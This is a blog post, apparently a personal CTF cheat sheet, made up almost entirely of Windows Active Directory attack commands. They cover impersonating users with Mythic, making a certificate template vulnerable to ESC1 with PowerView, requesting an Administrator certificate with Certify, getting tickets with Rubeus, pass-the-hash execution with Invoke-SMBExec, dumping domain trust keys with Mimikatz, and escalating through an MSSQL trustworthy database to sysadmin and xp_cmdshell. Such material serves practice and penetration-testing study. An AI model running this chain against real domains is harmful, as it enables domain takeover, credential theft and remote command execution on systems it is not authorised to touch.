---
title: "Helpful windows command for CTF"
date: 2025-11-03 10:00:00 -0500
categories: [windows, ctf]
tags: [windows, ctf, certipy, rubeus, standin, powershell]
description: "Dump of important commands and tools in windows CTF challenges."
---
## Impersonate user with their password (Similar to runas or runascs)

```
Mythic: make_token <domainName>\<username> <passworD>
```

## Create computer accounts

```powershell
##StandIn: 

Standin.exe -computer <computer name> -make
```

## Make certifiacte vulnerable to ESC1 using powerview

```powershell
Import-Module PowerView.ps1

Add-DomainObjectACL -TargetIdentity Machine -PrincipalIdentity "Domain Users" -RightsGUID "0e10c968-78fb-11d2-90d4-00c04f79dc55" -TargetSearchBase "LDAP://CN=Configuration,DC=mythical-us,DC=vl"

Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=mythical-us,DC=vl" -Identity Machine -XOR @{'mspki-certificate-name-flag'=1} -Verbose

Set-DomainObject -SearchBase "CN=Certificate Tempaltes,CN=Public Key Services,CN=Services,CN=Configuration,DC=mythical-us,DC=vl" -Identity Machine -Set @{'mspki-certificate-application-policy'='1.3.6.1.5.5.7.3.2'} -Verbose
```

## Request the certificate for admin with certify

```powershell
Certify.exe request /ca:dc01.mythical-us.vl\mythical-us-DC01-CA /template:Machine /altname:Administrator@mythical-us.vl
```

## User Rubeus to get ticket as Administrator from the generated .pfx file

```powershell
Rubeus.exe asktgt /user:Administrator /certificate:<path to .pfx file> /ptt /nowrap /getcredentials
```

## User Invoke-SMBExec.ps1 to run commands using that ticket or NTHASH as the administrator

```powershell
Invoke-SMBExec -Target 127.0.0.1 -Domain mythical-us.vl -Username Administrator -Hash <NTHASH> -Command <PATH TO EXE/ OR ANY COMMAND>
```

## Path Domain trust with Mimikatz

```powershell
mimikatz.exe "lsadump::trust /path"

## Get ticket with Rubeus with the hash obtained from above commands
Rubeus.exe asktgt /user:mythical-us$ /domain:mythical-eu.vl /rc4:<HASH> /nowrap /ptt
```

## List trustworthy databases MSSQL

```sql
SELECT a.name, b.is_trustworthy_on FROM master..sysdatabases as a INNER JOIN sys.databases as b ON a.name = b.name;
```

## Check privilages on databses to see if we are owner of a trustworthy database

```sql
SELECT rp.name as database_role, mp.name as database_user FROM sys.database_role_members drm JOIN sys.database_principals rp on (drm.role_principal_id = rp.principal_id) JOIN sys.database_principals mp on (drm.member_principal_id = mp.principal_id)
```

## Create a stored procedure to get sysadmnin privilages on the trustworthy database

```sql
CREATE OR ALTER PROCEDURE dbo.xct WITH EXECUTE AS owner AS ALTER SERVER ROLE sysadmin ADD MEMBER [MYTHICAL-EU\svc_sql];
```

## Run the stored procedure

```sql
EXEC dbo.xct;
```

## After this you can enable xp_cmdshell and have command execution/privilage escalation

```sql
EXEC sp_configure 'show advanced options',1; Reconfigure;

EXEC sp_configure 'xp_cmdshell',1; Reconfigure;

EXEC xp_cmdshell 'whoami'
```
